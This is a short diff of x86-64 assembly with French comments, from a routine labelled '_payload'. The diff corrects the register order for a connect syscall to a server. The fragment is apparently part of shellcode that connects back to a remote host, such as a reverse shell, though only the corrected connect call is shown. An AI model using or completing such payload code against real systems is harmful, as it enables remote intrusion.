@@ -72,8 +72,8 @@ _payload:
 
     ; Connecter au serveur
     mov rax, 42 ; SYS_connect
-    lea rdi, [sockaddr_in]
-    mov rsi, r13
+    mov rdi, r13
+    lea rsi, [sockaddr_in]
     mov rdx, 16 ; Taille de sockaddr_in
     syscall
     test rax, rax
